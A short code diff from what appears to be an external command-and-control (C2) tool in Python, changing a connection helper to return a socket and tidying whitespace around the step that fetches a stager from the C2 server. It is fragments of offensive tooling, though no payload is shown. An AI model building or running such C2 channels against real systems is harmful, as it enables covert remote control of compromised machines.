@@ -69,7 +69,7 @@ class commonUtils(object):
 		d = {}
 		d['sock'] = socket.create_connection((EXTERNAL_C2_ADDR, int(EXTERNAL_C2_PORT)))
 		d['state'] = 1
-		return (d)
+		return (d['sock'])
 
 	@staticmethod
 	def sendFrameToC2(sock, chunk):
@@ -344,7 +344,7 @@ def main():
 
 		# Prep the transport module
 		transport.prepTransport()
-		
+
 		# Let's get the stager from the c2 server
 		stager_status = configureStage.main(sock)
 
